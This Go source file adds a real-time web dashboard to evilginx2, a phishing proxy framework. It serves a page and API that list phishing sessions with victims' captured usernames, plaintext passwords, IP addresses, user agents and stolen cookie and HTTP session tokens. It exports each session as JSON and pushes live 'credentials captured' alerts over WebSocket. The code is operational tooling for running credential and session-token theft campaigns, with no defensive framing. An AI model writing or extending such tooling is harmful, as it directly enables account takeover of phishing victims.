package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type WebDashboard struct {
	server     *http.Server
	router     *mux.Router
	config     *Config
	db         *database.Database
	proxy      *HttpProxy
	upgrader   websocket.Upgrader
	clients    map[*websocket.Conn]bool
	clientsMux sync.RWMutex
	broadcast  chan []byte
	isRunning  bool
	port       int
}

type DashboardData struct {
	Sessions       []*DashboardSession `json:"sessions"`
	Stats          *DashboardStats     `json:"stats"`
	Phishlets      []*DashboardPhishlet `json:"phishlets"`
	RecentActivity []*ActivityEvent     `json:"recent_activity"`
}

type DashboardSession struct {
	ID          string    `json:"id"`
	Index       int       `json:"index"`
	Phishlet    string    `json:"phishlet"`
	Username    string    `json:"username"`
	Password    string    `json:"password"`
	LandingURL  string    `json:"landing_url"`
	UserAgent   string    `json:"user_agent"`
	RemoteAddr  string    `json:"remote_addr"`
	IsDone      bool      `json:"is_done"`
	CreateTime  time.Time `json:"create_time"`
	UpdateTime  time.Time `json:"update_time"`
	TokenCount  int       `json:"token_count"`
	Country     string    `json:"country"`
	City        string    `json:"city"`
}

type DashboardStats struct {
	TotalSessions    int `json:"total_sessions"`
	ActiveSessions   int `json:"active_sessions"`
	CompletedSessions int `json:"completed_sessions"`
	TotalCredentials int `json:"total_credentials"`
	TotalTokens      int `json:"total_tokens"`
	TodaySessions    int `json:"today_sessions"`
}

type DashboardPhishlet struct {
	Name        string `json:"name"`
	Enabled     bool   `json:"enabled"`
	Visible     bool   `json:"visible"`
	Hostname    string `json:"hostname"`
	SessionCount int   `json:"session_count"`
}

type ActivityEvent struct {
	Type      string    `json:"type"`
	Message   string    `json:"message"`
	Timestamp time.Time `json:"timestamp"`
	SessionID string    `json:"session_id"`
	Severity  string    `json:"severity"`
}

type WSMessage struct {
	Type string      `json:"type"`
	Data interface{} `json:"data"`
}

func NewWebDashboard(config *Config, db *database.Database, proxy *HttpProxy, port int) *WebDashboard {
	dashboard := &WebDashboard{
		config:    config,
		db:        db,
		proxy:     proxy,
		port:      port,
		clients:   make(map[*websocket.Conn]bool),
		broadcast: make(chan []byte),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true // Allow all origins in development
			},
		},
	}

	dashboard.setupRoutes()
	return dashboard
}

func (d *WebDashboard) setupRoutes() {
	d.router = mux.NewRouter()
	
	// Static files
	d.router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("./dashboard/static/"))))
	
	// API routes
	api := d.router.PathPrefix("/api").Subrouter()
	api.HandleFunc("/sessions", d.handleGetSessions).Methods("GET")
	api.HandleFunc("/sessions/{id}", d.handleGetSession).Methods("GET")
	api.HandleFunc("/sessions/{id}/tokens", d.handleGetSessionTokens).Methods("GET")
	api.HandleFunc("/sessions/{id}/export", d.handleExportSession).Methods("GET")
	api.HandleFunc("/stats", d.handleGetStats).Methods("GET")
	api.HandleFunc("/phishlets", d.handleGetPhishlets).Methods("GET")
	api.HandleFunc("/phishlets/{name}/toggle", d.handleTogglePhishlet).Methods("POST")
	api.HandleFunc("/activity", d.handleGetActivity).Methods("GET")
	
	// WebSocket endpoint
	d.router.HandleFunc("/ws", d.handleWebSocket)
	
	// Main dashboard route
	d.router.HandleFunc("/", d.handleDashboard).Methods("GET")
	d.router.HandleFunc("/dashboard", d.handleDashboard).Methods("GET")
	
	d.server = &http.Server{
		Addr:    fmt.Sprintf(":%d", d.port),
		Handler: d.router,
	}
}

func (d *WebDashboard) Start() error {
	if d.isRunning {
		return fmt.Errorf("dashboard is already running")
	}

	// Start WebSocket message broadcaster
	go d.handleMessages()

	d.isRunning = true
	log.Info("Web dashboard starting on port %d", d.port)
	log.Info("Access dashboard at: http://localhost:%d", d.port)
	
	return d.server.ListenAndServe()
}

func (d *WebDashboard) Stop() error {
	if !d.isRunning {
		return nil
	}
	
	d.isRunning = false
	close(d.broadcast)
	
	// Close all WebSocket connections
	d.clientsMux.Lock()
	for client := range d.clients {
		client.Close()
	}
	d.clientsMux.Unlock()
	
	return d.server.Close()
}

func (d *WebDashboard) handleDashboard(w http.ResponseWriter, r *http.Request) {
	tmpl := `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Evilginx Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #fff; }
        .header { background: #2d2d2d; padding: 1rem; border-bottom: 2px solid #444; }
        .header h1 { color: #ff6b6b; display: inline-block; }
        .header .status { float: right; color: #4ecdc4; }
        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 2rem; }
        .stat-card { background: #2d2d2d; padding: 1.5rem; border-radius: 8px; border-left: 4px solid #4ecdc4; }
        .stat-card h3 { color: #4ecdc4; margin-bottom: 0.5rem; }
        .stat-card .value { font-size: 2rem; font-weight: bold; color: #fff; }
        .main-content { display: grid; grid-template-columns: 2fr 1fr; gap: 2rem; }
        .sessions-panel { background: #2d2d2d; border-radius: 8px; padding: 1.5rem; }
        .activity-panel { background: #2d2d2d; border-radius: 8px; padding: 1.5rem; }
        .panel-header { display: flex; justify-content: between; align-items: center; margin-bottom: 1rem; }
        .panel-title { color: #4ecdc4; font-size: 1.2rem; }
        .refresh-btn { background: #4ecdc4; color: #1a1a1a; border: none; padding: 0.5rem 1rem; border-radius: 4px; cursor: pointer; }
        .refresh-btn:hover { background: #45b7aa; }
        .session-item { background: #383838; margin-bottom: 1rem; padding: 1rem; border-radius: 6px; border-left: 4px solid #ff6b6b; }
        .session-item.completed { border-left-color: #4ecdc4; }
        .session-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem; }
        .session-id { color: #4ecdc4; font-weight: bold; }
        .session-status { padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.8rem; }
        .status-active { background: #ff6b6b; color: white; }
        .status-completed { background: #4ecdc4; color: #1a1a1a; }
        .session-details { font-size: 0.9rem; color: #ccc; }
        .activity-item { padding: 0.75rem; border-bottom: 1px solid #444; }
        .activity-item:last-child { border-bottom: none; }
        .activity-time { color: #888; font-size: 0.8rem; }
        .activity-message { margin-top: 0.25rem; }
        .severity-info { color: #4ecdc4; }
        .severity-warning { color: #ffa726; }
        .severity-error { color: #ff6b6b; }
        .severity-success { color: #66bb6a; }
        .loading { text-align: center; padding: 2rem; color: #888; }
        .no-data { text-align: center; padding: 2rem; color: #888; }
        .connection-status { position: fixed; top: 20px; right: 20px; padding: 0.5rem 1rem; border-radius: 4px; font-size: 0.9rem; }
        .connected { background: #4ecdc4; color: #1a1a1a; }
        .disconnected { background: #ff6b6b; color: white; }
        .session-details-btn { background: #4ecdc4; color: #1a1a1a; border: none; padding: 0.25rem 0.5rem; border-radius: 4px; cursor: pointer; font-size: 0.8rem; }
        .session-details-btn:hover { background: #45b7aa; }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); }
        .modal-content { background: #2d2d2d; margin: 5% auto; padding: 2rem; width: 80%; max-width: 800px; border-radius: 8px; max-height: 80vh; overflow-y: auto; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
        .modal-title { color: #4ecdc4; font-size: 1.5rem; }
        .close { color: #aaa; font-size: 28px; font-weight: bold; cursor: pointer; }
        .close:hover { color: #fff; }
        .token-section { margin-bottom: 1.5rem; }
        .token-section h3 { color: #4ecdc4; margin-bottom: 0.5rem; }
        .token-list { background: #383838; padding: 1rem; border-radius: 4px; font-family: monospace; font-size: 0.9rem; }
        .export-btn { background: #ff6b6b; color: white; border: none; padding: 0.5rem 1rem; border-radius: 4px; cursor: pointer; margin-left: 1rem; }
        .export-btn:hover { background: #ff5252; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🕷️ Evilginx Dashboard</h1>
        <div class="status">Live Monitoring</div>
    </div>

    <div class="connection-status" id="connectionStatus">
        <span id="statusText">Connecting...</span>
    </div>

    <div class="container">
        <div class="stats-grid" id="statsGrid">
            <div class="stat-card">
                <h3>Total Sessions</h3>
                <div class="value" id="totalSessions">0</div>
            </div>
            <div class="stat-card">
                <h3>Active Sessions</h3>
                <div class="value" id="activeSessions">0</div>
            </div>
            <div class="stat-card">
                <h3>Completed</h3>
                <div class="value" id="completedSessions">0</div>
            </div>
            <div class="stat-card">
                <h3>Credentials</h3>
                <div class="value" id="totalCredentials">0</div>
            </div>
            <div class="stat-card">
                <h3>Tokens</h3>
                <div class="value" id="totalTokens">0</div>
            </div>
            <div class="stat-card">
                <h3>Today</h3>
                <div class="value" id="todaySessions">0</div>
            </div>
        </div>

        <div class="main-content">
            <div class="sessions-panel">
                <div class="panel-header">
                    <h2 class="panel-title">Recent Sessions</h2>
                    <button class="refresh-btn" onclick="refreshSessions()">Refresh</button>
                </div>
                <div id="sessionsList">
                    <div class="loading">Loading sessions...</div>
                </div>
            </div>

            <div class="activity-panel">
                <div class="panel-header">
                    <h2 class="panel-title">Live Activity</h2>
                </div>
                <div id="activityList">
                    <div class="loading">Loading activity...</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Session Details Modal -->
    <div id="sessionModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Session Details</h2>
                <span class="close" onclick="closeModal()">&times;</span>
            </div>
            <div id="sessionDetails">
                <div class="loading">Loading session details...</div>
            </div>
        </div>
    </div>

    <script>
        let ws = null;
        let reconnectInterval = null;

        function connectWebSocket() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = protocol + '//' + window.location.host + '/ws';
            
            ws = new WebSocket(wsUrl);
            
            ws.onopen = function() {
                console.log('WebSocket connected');
                updateConnectionStatus(true);
                if (reconnectInterval) {
                    clearInterval(reconnectInterval);
                    reconnectInterval = null;
                }
            };
            
            ws.onmessage = function(event) {
                const message = JSON.parse(event.data);
                handleWebSocketMessage(message);
            };
            
            ws.onclose = function() {
                console.log('WebSocket disconnected');
                updateConnectionStatus(false);
                if (!reconnectInterval) {
                    reconnectInterval = setInterval(connectWebSocket, 5000);
                }
            };
            
            ws.onerror = function(error) {
                console.error('WebSocket error:', error);
                updateConnectionStatus(false);
            };
        }

        function updateConnectionStatus(connected) {
            const statusEl = document.getElementById('connectionStatus');
            const statusText = document.getElementById('statusText');
            
            if (connected) {
                statusEl.className = 'connection-status connected';
                statusText.textContent = 'Connected';
            } else {
                statusEl.className = 'connection-status disconnected';
                statusText.textContent = 'Disconnected';
            }
        }

        function handleWebSocketMessage(message) {
            switch (message.type) {
                case 'session_update':
                    updateSession(message.data);
                    break;
                case 'new_session':
                    addNewSession(message.data);
                    break;
                case 'stats_update':
                    updateStats(message.data);
                    break;
                case 'activity':
                    addActivity(message.data);
                    break;
                case 'credential_captured':
                    handleCredentialCapture(message.data);
                    break;
            }
        }

        function updateStats(stats) {
            document.getElementById('totalSessions').textContent = stats.total_sessions;
            document.getElementById('activeSessions').textContent = stats.active_sessions;
            document.getElementById('completedSessions').textContent = stats.completed_sessions;
            document.getElementById('totalCredentials').textContent = stats.total_credentials;
            document.getElementById('totalTokens').textContent = stats.total_tokens;
            document.getElementById('todaySessions').textContent = stats.today_sessions;
        }

        function addActivity(activity) {
            const activityList = document.getElementById('activityList');
            const activityItem = document.createElement('div');
            activityItem.className = 'activity-item';
            
            const time = new Date(activity.timestamp).toLocaleTimeString();
            const severityClass = 'severity-' + activity.severity;
            
            activityItem.innerHTML = ` + "`" + `
                <div class="activity-time">${time}</div>
                <div class="activity-message ${severityClass}">${activity.message}</div>
            ` + "`" + `;
            
            activityList.insertBefore(activityItem, activityList.firstChild);
            
            // Keep only last 50 activities
            while (activityList.children.length > 50) {
                activityList.removeChild(activityList.lastChild);
            }
        }

        function handleCredentialCapture(data) {
            addActivity({
                type: 'credential_captured',
                message: '🎯 Credentials captured for session ' + data.session_id,
                timestamp: new Date().toISOString(),
                severity: 'success'
            });
        }

        function addNewSession(session) {
            const sessionsList = document.getElementById('sessionsList');
            const sessionItem = createSessionElement(session);
            
            if (sessionsList.querySelector('.loading') || sessionsList.querySelector('.no-data')) {
                sessionsList.innerHTML = '';
            }
            
            sessionsList.insertBefore(sessionItem, sessionsList.firstChild);
        }

        function updateSession(session) {
            const existingSession = document.querySelector('[data-session-id="' + session.id + '"]');
            if (existingSession) {
                const newSession = createSessionElement(session);
                existingSession.parentNode.replaceChild(newSession, existingSession);
            } else {
                addNewSession(session);
            }
        }

        function createSessionElement(session) {
            const sessionItem = document.createElement('div');
            sessionItem.className = 'session-item' + (session.is_done ? ' completed' : '');
            sessionItem.setAttribute('data-session-id', session.id);
            
            const time = new Date(session.create_time).toLocaleString();
            const statusClass = session.is_done ? 'status-completed' : 'status-active';
            const statusText = session.is_done ? 'Completed' : 'Active';
            
            sessionItem.innerHTML = ` + "`" + `
                <div class="session-header">
                    <span class="session-id">#${session.index} - ${session.id.substring(0, 8)}</span>
                    <span class="session-status ${statusClass}">${statusText}</span>
                </div>
                <div class="session-details">
                    <div><strong>Phishlet:</strong> ${session.phishlet}</div>
                    <div><strong>IP:</strong> ${session.remote_addr}</div>
                    <div><strong>Time:</strong> ${time}</div>
                    ${session.username ? '<div><strong>Username:</strong> ' + session.username + '</div>' : ''}
                    ${session.password ? '<div><strong>Password:</strong> ' + session.password + '</div>' : ''}
                    <div><strong>Tokens:</strong> ${session.token_count}</div>
                    <button class="session-details-btn" onclick="showSessionDetails('${session.id}')">View Details</button>
                </div>
            ` + "`" + `;
            
            return sessionItem;
        }

        function showSessionDetails(sessionId) {
            const modal = document.getElementById('sessionModal');
            const detailsDiv = document.getElementById('sessionDetails');
            
            detailsDiv.innerHTML = '<div class="loading">Loading session details...</div>';
            modal.style.display = 'block';
            
            fetch('/api/sessions/' + sessionId)
                .then(response => response.json())
                .then(session => {
                    fetch('/api/sessions/' + sessionId + '/tokens')
                        .then(response => response.json())
                        .then(tokens => {
                            displaySessionDetails(session, tokens);
                        });
                })
                .catch(error => {
                    detailsDiv.innerHTML = '<div class="error">Error loading session details</div>';
                });
        }

        function displaySessionDetails(session, tokens) {
            const detailsDiv = document.getElementById('sessionDetails');
            const time = new Date(session.create_time).toLocaleString();
            
            let html = ` + "`" + `
                <div class="session-info">
                    <h3>Session Information</h3>
                    <p><strong>ID:</strong> ${session.id}</p>
                    <p><strong>Phishlet:</strong> ${session.phishlet}</p>
                    <p><strong>Username:</strong> ${session.username || 'Not captured'}</p>
                    <p><strong>Password:</strong> ${session.password || 'Not captured'}</p>
                    <p><strong>Landing URL:</strong> ${session.landing_url}</p>
                    <p><strong>User Agent:</strong> ${session.user_agent}</p>
                    <p><strong>Remote Address:</strong> ${session.remote_addr}</p>
                    <p><strong>Created:</strong> ${time}</p>
                    <p><strong>Status:</strong> ${session.is_done ? 'Completed' : 'Active'}</p>
                    <button class="export-btn" onclick="exportSession('${session.id}')">Export Session</button>
                </div>
            ` + "`" + `;
            
            if (tokens.cookie_tokens && Object.keys(tokens.cookie_tokens).length > 0) {
                html += ` + "`" + `
                    <div class="token-section">
                        <h3>Cookie Tokens</h3>
                        <div class="token-list">${JSON.stringify(tokens.cookie_tokens, null, 2)}</div>
                    </div>
                ` + "`" + `;
            }
            
            if (tokens.body_tokens && Object.keys(tokens.body_tokens).length > 0) {
                html += ` + "`" + `
                    <div class="token-section">
                        <h3>Body Tokens</h3>
                        <div class="token-list">${JSON.stringify(tokens.body_tokens, null, 2)}</div>
                    </div>
                ` + "`" + `;
            }
            
            if (tokens.http_tokens && Object.keys(tokens.http_tokens).length > 0) {
                html += ` + "`" + `
                    <div class="token-section">
                        <h3>HTTP Tokens</h3>
                        <div class="token-list">${JSON.stringify(tokens.http_tokens, null, 2)}</div>
                    </div>
                ` + "`" + `;
            }
            
            detailsDiv.innerHTML = html;
        }

        function closeModal() {
            document.getElementById('sessionModal').style.display = 'none';
        }

        function exportSession(sessionId) {
            window.open('/api/sessions/' + sessionId + '/export', '_blank');
        }

        function refreshSessions() {
            fetch('/api/sessions')
                .then(response => response.json())
                .then(sessions => {
                    const sessionsList = document.getElementById('sessionsList');
                    
                    if (sessions.length === 0) {
                        sessionsList.innerHTML = '<div class="no-data">No sessions found</div>';
                        return;
                    }
                    
                    sessionsList.innerHTML = '';
                    sessions.forEach(session => {
                        sessionsList.appendChild(createSessionElement(session));
                    });
                })
                .catch(error => {
                    console.error('Error loading sessions:', error);
                });
        }

        function loadInitialData() {
            // Load stats
            fetch('/api/stats')
                .then(response => response.json())
                .then(stats => updateStats(stats))
                .catch(error => console.error('Error loading stats:', error));
            
            // Load sessions
            refreshSessions();
            
            // Load activity
            fetch('/api/activity')
                .then(response => response.json())
                .then(activities => {
                    const activityList = document.getElementById('activityList');
                    
                    if (activities.length === 0) {
                        activityList.innerHTML = '<div class="no-data">No recent activity</div>';
                        return;
                    }
                    
                    activityList.innerHTML = '';
                    activities.forEach(activity => {
                        addActivity(activity);
                    });
                })
                .catch(error => console.error('Error loading activity:', error));
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            connectWebSocket();
            loadInitialData();
            
            // Refresh data every 30 seconds
            setInterval(loadInitialData, 30000);
        });

        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('sessionModal');
            if (event.target === modal) {
                closeModal();
            }
        }
    </script>
</body>
</html>
	`
	
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(tmpl))
}

func (d *WebDashboard) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := d.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error("WebSocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	d.clientsMux.Lock()
	d.clients[conn] = true
	d.clientsMux.Unlock()

	log.Debug("WebSocket client connected: %s", r.RemoteAddr)

	// Send initial data
	d.sendInitialData(conn)

	// Keep connection alive
	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			log.Debug("WebSocket client disconnected: %s", r.RemoteAddr)
			d.clientsMux.Lock()
			delete(d.clients, conn)
			d.clientsMux.Unlock()
			break
		}
	}
}

func (d *WebDashboard) sendInitialData(conn *websocket.Conn) {
	// Send current stats
	stats := d.getStats()
	d.sendToClient(conn, "stats_update", stats)
	
	// Send recent sessions
	sessions := d.getSessions(20)
	for _, session := range sessions {
		d.sendToClient(conn, "session_update", session)
	}
}

func (d *WebDashboard) sendToClient(conn *websocket.Conn, msgType string, data interface{}) {
	message := WSMessage{
		Type: msgType,
		Data: data,
	}
	
	jsonData, err := json.Marshal(message)
	if err != nil {
		log.Error("Error marshaling WebSocket message: %v", err)
		return
	}
	
	err = conn.WriteMessage(websocket.TextMessage, jsonData)
	if err != nil {
		log.Error("Error sending WebSocket message: %v", err)
	}
}

func (d *WebDashboard) BroadcastMessage(msgType string, data interface{}) {
	message := WSMessage{
		Type: msgType,
		Data: data,
	}
	
	jsonData, err := json.Marshal(message)
	if err != nil {
		log.Error("Error marshaling broadcast message: %v", err)
		return
	}
	
	select {
	case d.broadcast <- jsonData:
	default:
		// Channel is full, skip this message
	}
}

func (d *WebDashboard) handleMessages() {
	for {
		select {
		case message, ok := <-d.broadcast:
			if !ok {
				return
			}
			
			d.clientsMux.RLock()
			for client := range d.clients {
				err := client.WriteMessage(websocket.TextMessage, message)
				if err != nil {
					log.Error("Error broadcasting message: %v", err)
					client.Close()
					delete(d.clients, client)
				}
			}
			d.clientsMux.RUnlock()
		}
	}
}

// API Handlers
func (d *WebDashboard) handleGetSessions(w http.ResponseWriter, r *http.Request) {
	limit := 50
	if l := r.URL.Query().Get("limit"); l != "" {
		if parsed, err := strconv.Atoi(l); err == nil {
			limit = parsed
		}
	}
	
	sessions := d.getSessions(limit)
	d.sendJSONResponse(w, sessions)
}

func (d *WebDashboard) handleGetSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]
	
	session := d.getSession(sessionID)
	if session == nil {
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}
	
	d.sendJSONResponse(w, session)
}

func (d *WebDashboard) handleGetSessionTokens(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]
	
	tokens := d.getSessionTokens(sessionID)
	d.sendJSONResponse(w, tokens)
}

func (d *WebDashboard) handleExportSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]
	
	session := d.getSession(sessionID)
	if session == nil {
		http.Error(w, "Session not found", http.StatusNotFound)
		return
	}
	
	tokens := d.getSessionTokens(sessionID)
	
	exportData := map[string]interface{}{
		"session": session,
		"tokens":  tokens,
	}
	
	jsonData, err := json.MarshalIndent(exportData, "", "  ")
	if err != nil {
		http.Error(w, "Error exporting session", http.StatusInternalServerError)
		return
	}
	
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=session_%s.json", sessionID))
	w.Write(jsonData)
}

func (d *WebDashboard) handleGetStats(w http.ResponseWriter, r *http.Request) {
	stats := d.getStats()
	d.sendJSONResponse(w, stats)
}

func (d *WebDashboard) handleGetPhishlets(w http.ResponseWriter, r *http.Request) {
	phishlets := d.getPhishlets()
	d.sendJSONResponse(w, phishlets)
}

func (d *WebDashboard) handleTogglePhishlet(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	_ = vars["name"] // TODO: implement phishlet toggle functionality
	
	// Toggle phishlet enabled status
	// This would need to be implemented based on your config system
	
	d.sendJSONResponse(w, map[string]string{"status": "success"})
}

func (d *WebDashboard) handleGetActivity(w http.ResponseWriter, r *http.Request) {
	// Return recent activity events
	// This would need to be implemented based on your logging system
	
	activity := []*ActivityEvent{
		{
			Type:      "session_created",
			Message:   "New session created",
			Timestamp: time.Now(),
			Severity:  "info",
		},
	}
	
	d.sendJSONResponse(w, activity)
}

func (d *WebDashboard) sendJSONResponse(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(data)
}

// Data retrieval methods
func (d *WebDashboard) getSessions(limit int) []*DashboardSession {
	sessions, err := d.db.ListSessions()
	if err != nil {
		log.Error("Error getting sessions: %v", err)
		return []*DashboardSession{}
	}
	
	var dashboardSessions []*DashboardSession
	for i, session := range sessions {
		if i >= limit {
			break
		}
		
		dashboardSession := &DashboardSession{
			ID:         session.SessionId,
			Index:      session.Id,
			Phishlet:   session.Phishlet,
			Username:   session.Username,
			Password:   session.Password,
			LandingURL: session.LandingURL,
			UserAgent:  session.UserAgent,
			RemoteAddr: session.RemoteAddr,
			IsDone:     session.Username != "" && session.Password != "",
			CreateTime: time.Unix(session.CreateTime, 0),
			UpdateTime: time.Unix(session.UpdateTime, 0),
			TokenCount: len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens),
		}
		
		dashboardSessions = append(dashboardSessions, dashboardSession)
	}
	
	return dashboardSessions
}

func (d *WebDashboard) getSession(sessionID string) *DashboardSession {
	sessions := d.getSessions(1000) // Get more sessions to find the specific one
	for _, session := range sessions {
		if session.ID == sessionID {
			return session
		}
	}
	return nil
}

func (d *WebDashboard) getSessionTokens(sessionID string) map[string]interface{} {
	sessions, err := d.db.ListSessions()
	if err != nil {
		return map[string]interface{}{}
	}
	
	for _, session := range sessions {
		if session.SessionId == sessionID {
			return map[string]interface{}{
				"cookie_tokens": session.CookieTokens,
				"body_tokens":   session.BodyTokens,
				"http_tokens":   session.HttpTokens,
			}
		}
	}
	
	return map[string]interface{}{}
}

func (d *WebDashboard) getStats() *DashboardStats {
	sessions, err := d.db.ListSessions()
	if err != nil {
		return &DashboardStats{}
	}
	
	stats := &DashboardStats{}
	today := time.Now().Truncate(24 * time.Hour)
	
	for _, session := range sessions {
		stats.TotalSessions++
		
		if session.Username != "" {
			stats.TotalCredentials++
		}
		
		if session.Username != "" && session.Password != "" {
			stats.CompletedSessions++
		} else {
			stats.ActiveSessions++
		}
		
		stats.TotalTokens += len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
		
		if time.Unix(session.CreateTime, 0).After(today) {
			stats.TodaySessions++
		}
	}
	
	return stats
}

func (d *WebDashboard) getPhishlets() []*DashboardPhishlet {
	var phishlets []*DashboardPhishlet
	
	for name, _ := range d.config.phishlets {
		config := d.config.phishletConfig[name]
		enabled := config != nil && config.Enabled
		visible := config != nil && config.Visible
		hostname := ""
		if config != nil {
			hostname = config.Hostname
		}
		
		dashboardPhishlet := &DashboardPhishlet{
			Name:         name,
			Enabled:      enabled,
			Visible:      visible,
			Hostname:     hostname,
			SessionCount: 0, // Would need to calculate from sessions
		}
		
		phishlets = append(phishlets, dashboardPhishlet)
	}
	
	return phishlets
}

// Methods to be called from other parts of the application
func (d *WebDashboard) NotifyNewSession(session *Session) {
	if !d.isRunning {
		return
	}
	
	dashboardSession := &DashboardSession{
		ID:         session.Id,
		Phishlet:   session.Name,
		Username:   session.Username,
		Password:   session.Password,
		RemoteAddr: session.RemoteAddr,
		UserAgent:  session.UserAgent,
		IsDone:     session.IsDone,
		CreateTime: time.Now(),
		UpdateTime: time.Now(),
		TokenCount: len(session.CookieTokens),
	}
	
	d.BroadcastMessage("new_session", dashboardSession)
	d.BroadcastMessage("activity", &ActivityEvent{
		Type:      "new_session",
		Message:   fmt.Sprintf("New session created: %s", session.RemoteAddr),
		Timestamp: time.Now(),
		SessionID: session.Id,
		Severity:  "info",
	})
}

func (d *WebDashboard) NotifyCredentialCapture(session *Session) {
	if !d.isRunning {
		return
	}
	
	d.BroadcastMessage("credential_captured", map[string]interface{}{
		"session_id": session.Id,
		"username":   session.Username,
		"password":   session.Password,
	})
	
	d.BroadcastMessage("activity", &ActivityEvent{
		Type:      "credential_captured",
		Message:   fmt.Sprintf("🎯 Credentials captured: %s", session.Username),
		Timestamp: time.Now(),
		SessionID: session.Id,
		Severity:  "success",
	})
}

func (d *WebDashboard) NotifyTokenCapture(session *Session, tokenType string) {
	if !d.isRunning {
		return
	}
	
	d.BroadcastMessage("activity", &ActivityEvent{
		Type:      "token_captured",
		Message:   fmt.Sprintf("🍪 %s token captured for session", tokenType),
		Timestamp: time.Now(),
		SessionID: session.Id,
		Severity:  "success",
	})
} 